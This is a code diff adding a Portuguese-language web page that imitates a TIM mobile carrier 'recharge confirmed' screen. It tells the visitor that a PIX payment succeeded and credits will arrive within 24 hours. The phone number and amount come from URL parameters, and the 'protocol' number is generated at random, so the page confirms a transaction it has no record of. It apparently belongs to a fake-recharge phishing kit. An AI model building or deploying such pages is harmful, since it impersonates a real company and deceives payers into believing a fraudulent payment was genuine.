@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIM - Recarga Confirmada</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { background-color: #0114C4; margin: 0; padding: 0; color: #333; }
+        .mobile-container { max-width: 480px; margin: 0 auto; background-color: #0114C4; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        header { padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .menu-icon { display: flex; flex-direction: column; gap: 4px; }
+        .menu-icon span { display: block; width: 24px; height: 2px; background-color: white; }
+        .tim-logo-header { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; text-decoration: none; color: white; }
+        
+        .main-content { flex: 1; display: flex; flex-direction: column; }
+        .card { background: white; border-radius: 24px 24px 0 0; padding: 32px 20px 24px; flex: 1; margin-top: 10px; text-align: center; }
+
+        .success-icon {
+            width: 80px; height: 80px; border-radius: 50%;
+            background: linear-gradient(135deg, #00C853, #00E676);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 18px; box-shadow: 0 6px 24px rgba(0, 200, 83, 0.4);
+            animation: pulseGreen 2s ease-in-out infinite;
+        }
+        @keyframes pulseGreen {
+            0%, 100% { box-shadow: 0 6px 24px rgba(0, 200, 83, 0.4); }
+            50% { box-shadow: 0 8px 32px rgba(0, 200, 83, 0.6); }
+        }
+        .success-icon svg { width: 44px; height: 44px; }
+
+        h1 { font-size: 22px; color: #001A33; font-weight: 900; margin: 0 0 8px; }
+        .subtitle { font-size: 13px; color: #555; margin: 0 0 20px; line-height: 1.4; }
+
+        .aviso-box {
+            background: #F0FFF4; border: 2px solid #00C853; border-radius: 16px;
+            padding: 18px 16px; text-align: center; margin-bottom: 20px;
+        }
+        .aviso-badge {
+            display: inline-block; background: #00C853; color: white;
+            font-size: 11px; font-weight: 800; letter-spacing: 0.5px;
+            padding: 4px 12px; border-radius: 20px; margin-bottom: 10px;
+        }
+        .aviso-text {
+            font-size: 16px; color: #004D20; font-weight: 800; margin: 0 0 6px; line-height: 1.4;
+        }
+        .aviso-desc {
+            font-size: 12px; color: #2D6A4F; margin: 0; line-height: 1.4;
+        }
+
+        .details-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 12px; padding: 0 14px; margin-bottom: 24px; text-align: left; }
+        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #EAEAEA; font-size: 13px; }
+        .detail-row:last-child { border-bottom: none; }
+        .detail-row span { color: #666; }
+        .detail-row strong { color: #001A33; font-weight: 800; }
+
+        .status-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            color: #00C853; font-weight: 800; font-size: 12px;
+        }
+        .status-dot {
+            width: 8px; height: 8px; background: #00C853; border-radius: 50%;
+            animation: blinkDot 1.5s infinite ease-in-out;
+        }
+        @keyframes blinkDot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.85); }
+        }
+
+        .btn-home {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            width: 100%; padding: 16px; border: none; border-radius: 30px;
+            background: #0114C4; color: white; text-decoration: none;
+            font-size: 15px; font-weight: 800; cursor: pointer;
+            box-shadow: 0 4px 16px rgba(1, 20, 196, 0.25);
+            transition: all 0.2s ease;
+        }
+        .btn-home:active { transform: scale(0.98); }
+
+        .secure-footer { font-size: 11px; color: #00C853; font-weight: 800; line-height: 1.4; padding-top: 20px; }
+        .secure-footer span { color: #888; font-weight: 400; font-size: 10px; }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+        <header>
+            <a href="../index.html" class="tim-logo-header">
+                <span style="color: #FF192D;">≡</span>
+                <span class="tim-logo-text" style="color: white; letter-spacing: -1px;">TIM</span>
+            </a>
+            <div class="menu-icon">
+                <span></span><span></span><span></span>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="card">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                </div>
+
+                <h1>Recebemos a sua recarga!</h1>
+                <p class="subtitle">Seu pagamento foi confirmado com sucesso pelo sistema.</p>
+
+                <div class="aviso-box">
+                    <div class="aviso-badge">⏰ PRAZO DE LIBERAÇÃO</div>
+                    <div class="aviso-text">Recebemos a recarga e será enviado em <strong>até 24 horas</strong>.</div>
+                    <p class="aviso-desc">Os créditos já entraram na fila de ativação prioritária e estarão disponíveis na sua linha TIM.</p>
+                </div>
+
+                <div class="details-box">
+                    <div class="detail-row">
+                        <span>Número da Linha</span>
+                        <strong id="display-phone">(41) 99999-9999</strong>
+                    </div>
+                    <div class="detail-row">
+                        <span>Valor dos Créditos</span>
+                        <strong id="display-value" style="color: #0114C4; font-size: 15px;">R$ 20,00</strong>
+                    </div>
+                    <div class="detail-row">
+                        <span>Status</span>
+                        <div class="status-badge">
+                            <span class="status-dot"></span>
+                            Em processamento
+                        </div>
+                    </div>
+                    <div class="detail-row">
+                        <span>Protocolo</span>
+                        <strong id="protocolo-code" style="font-family: monospace; font-size: 12px; color: #555;">TIM-202611-9842</strong>
+                    </div>
+                    <div class="detail-row">
+                        <span>Forma de Pagamento</span>
+                        <strong style="display:flex;align-items:center;gap:6px;">
+                            <svg viewBox="0 0 512 512" width="12" height="12" fill="#32BCAD"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8z"/></svg>
+                            PIX
+                        </strong>
+                    </div>
+                </div>
+
+                <a href="../index.html" class="btn-home">Concluir e Voltar ao Início</a>
+
+                <div class="secure-footer">
+                    🔒 OPERAÇÃO CONCLUÍDA COM SEGURANÇA<br>
+                    <span>Você receberá um SMS de confirmação da operadora TIM.</span>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const phone = urlParams.get('phone');
+        const value = urlParams.get('value');
+
+        if (phone) document.getElementById('display-phone').textContent = phone;
+        if (value) document.getElementById('display-value').textContent = 'R$ ' + value;
+
+        const rnd = Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('protocolo-code').textContent = 'TIM-' + new Date().getFullYear() + '-' + rnd;
+    </script>
+</body>
+</html>
